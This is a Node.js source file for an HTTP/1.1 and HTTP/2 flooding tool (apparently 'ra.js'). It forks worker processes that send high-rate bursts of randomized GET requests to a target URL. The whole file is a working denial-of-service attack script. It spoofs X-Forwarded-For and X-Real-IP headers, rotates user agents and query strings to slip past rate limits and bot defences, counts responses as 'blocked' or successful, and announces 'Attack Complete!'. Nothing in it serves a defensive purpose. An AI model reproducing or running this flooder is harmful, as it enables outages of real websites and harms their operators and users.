const net = require("net");
const http = require("http");
const https = require("https");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6){
    console.log(`Usage: node ra.js URL TIME REQ_PER_SEC THREADS\nExample: node ra.js https://example.com/ 120 500 10`);
    console.log(`Note: HTTP/1.1 (50%) + HTTP/2 (50%) - High Rate Mode`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// ==================== TLS CONFIG ====================
const ciphersTLS = [
    "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305", "DHE-RSA-AES256-GCM-SHA384",
    "AES256-GCM-SHA384", "AES128-GCM-SHA256"
].join(":");

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_NO_COMPRESSION;

const secureContext = tls.createSecureContext({
    ciphers: ciphersTLS,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

// ==================== DATA ====================
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

// ==================== STATS ====================
let stats = {
    h1: { total: 0, success: 0, blocked: 0, error: 0, active: 0 },
    h2: { total: 0, success: 0, blocked: 0, error: 0, active: 0 }
};

// ==================== HELPERS ====================
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return `${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}`;
}

function getRandomPath() {
    return parsedTarget.path + 
        (Math.random() > 0.5 ? "?" + randomString(randomIntn(5,12)) + "=" + randomString(randomIntn(4,10)) : "");
}

// ==================== HTTP/1.1 FLOODER (GACOR MODE) ====================
function runHTTP1() {
    stats.h1.active++;
    
    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: 100,
        maxFreeSockets: 50,
        timeout: 5000,
        freeSocketTimeout: 30000,
        secureContext: secureContext,
        rejectUnauthorized: false
    });

    const startTime = Date.now();
    let requestCount = 0;
    
    const interval = setInterval(() => {
        if (Date.now() - startTime > args.time * 1000) {
            clearInterval(interval);
            agent.destroy();
            stats.h1.active--;
            return;
        }

        // Burst request - kirim banyak sekaligus
        for (let i = 0; i < 5; i++) {
            const options = {
                hostname: parsedTarget.hostname,
                port: 443,
                path: getRandomPath(),
                method: "GET",
                headers: {
                    "Host": parsedTarget.host,
                    "User-Agent": randomElement(userAgents),
                    "Accept": randomElement(acceptHeaders),
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "X-Forwarded-For": randomIP(),
                    "X-Real-IP": randomIP(),
                    "Referer": `https://${parsedTarget.host}/`,
                    "Cache-Control": "no-cache"
                },
                agent: agent
            };

            const req = https.request(options, (res) => {
                stats.h1.total++;
                if ([200, 301, 302, 304].includes(res.statusCode)) stats.h1.success++;
                else if ([403, 503, 429, 401].includes(res.statusCode)) stats.h1.blocked++;
                else stats.h1.error++;
                res.destroy();
            });

            req.on("error", () => {
                stats.h1.total++;
                stats.h1.error++;
            });

            req.setTimeout(3000, () => req.destroy());
            req.end();
        }
        
        requestCount += 5;
    }, Math.max(1, Math.floor(1000 / (args.Rate / 10))));
}

// ==================== HTTP/2 FLOODER (GACOR MODE) ====================
function runHTTP2() {
    stats.h2.active++;
    
    const tlsOptions = {
        port: 443,
        ALPNProtocols: ["h2"],
        ciphers: ciphersTLS,
        honorCipherOrder: true,
        host: parsedTarget.host,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: parsedTarget.host,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3"
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);

    tlsConn.once("secureConnect", () => {
        if (tlsConn.alpnProtocol !== "h2") {
            tlsConn.destroy();
            stats.h2.active--;
            return;
        }

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsConn,
            maxSessionMemory: 10000,
            maxConcurrentStreams: 1000
        });

        const startTime = Date.now();
        
        const interval = setInterval(() => {
            if (Date.now() - startTime > args.time * 1000) {
                clearInterval(interval);
                client.destroy();
                stats.h2.active--;
                return;
            }

            // Burst multiple streams HTTP/2
            for (let i = 0; i < 10; i++) {
                try {
                    const req = client.request({
                        ":method": "GET",
                        ":path": getRandomPath(),
                        ":scheme": "https",
                        ":authority": parsedTarget.host,
                        "user-agent": randomElement(userAgents),
                        "accept": randomElement(acceptHeaders),
                        "accept-language": "en-US,en;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "x-forwarded-for": randomIP(),
                        "x-real-ip": randomIP(),
                        "referer": `https://${parsedTarget.host}/`,
                        "cache-control": "no-cache"
                    });

                    req.on("response", (headers) => {
                        stats.h2.total++;
                        const status = headers[":status"];
                        if ([200, 301, 302, 304].includes(status)) stats.h2.success++;
                        else if ([403, 503, 429, 401].includes(status)) stats.h2.blocked++;
                        else stats.h2.error++;
                        req.close();
                    });

                    req.on("error", () => {
                        stats.h2.total++;
                        stats.h2.error++;
                    });

                    req.setTimeout(3000, () => req.close());
                    req.end();
                } catch(e) {
                    stats.h2.total++;
                    stats.h2.error++;
                }
            }
        }, Math.max(1, Math.floor(1000 / (args.Rate / 10))));
    });

    tlsConn.on("error", () => {
        stats.h2.active--;
    });
    
    tlsConn.on("timeout", () => {
        tlsConn.destroy();
        stats.h2.active--;
    });
}

// ==================== MASTER PROCESS ====================
if (cluster.isMaster) {
    console.log(`🔥 DUAL-PROTOCOL GACOR FLOOD`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Total Rate: ${args.Rate} req/sec`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`📊 Split: HTTP/1.1 (50%) + HTTP/2 (50%)`);
    console.log(`🚀 Mode: HIGH RATE (Multiple Intervals)`);
    console.log(`====================================\n`);

    // Live stats
    setInterval(() => {
        const total = stats.h1.total + stats.h2.total;
        const success = stats.h1.success + stats.h2.success;
        const rps = Math.floor(total / (Date.now() / 1000 - startTime));
        
        console.log(`[${new Date().toLocaleTimeString()}] ` +
            `Total: ${total} | ` +
            `H1: ${stats.h1.total}(${stats.h1.active}) | ` +
            `H2: ${stats.h2.total}(${stats.h2.active}) | ` +
            `✅: ${success} | ` +
            `RPS: ~${rps || 0}`
        );
    }, 2000);

    const startTime = Date.now();

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(`\n✅ Attack Complete!`);
        process.exit(0);
    }, args.time * 1000);

} else {
    console.log(`Worker ${cluster.worker.id} spinning up...`);
    
    // Multiple intervals per worker untuk rate tinggi
    const intervalsPerWorker = Math.min(50, args.Rate);
    
    // Rate dibagi 50% H1 dan 50% H2
    const ratePerProtocol = Math.floor(args.Rate / 2);
    
    // HTTP/1.1 intervals (25 intervals)
    for (let i = 0; i < Math.floor(intervalsPerWorker / 2); i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.h1.active < 2500) {
                    runHTTP1();
                }
            }, Math.max(1, Math.floor(1000 / (ratePerProtocol / Math.floor(intervalsPerWorker / 2)))));
        }, i * 10);
    }
    
    // HTTP/2 intervals (25 intervals)
    for (let i = 0; i < Math.floor(intervalsPerWorker / 2); i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.h2.active < 2500) {
                    runHTTP2();
                }
            }, Math.max(1, Math.floor(1000 / (ratePerProtocol / Math.floor(intervalsPerWorker / 2)))));
        }, i * 10 + 5); // Offset 5ms biar gak tabrakan
    }
}

// Error handlers
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
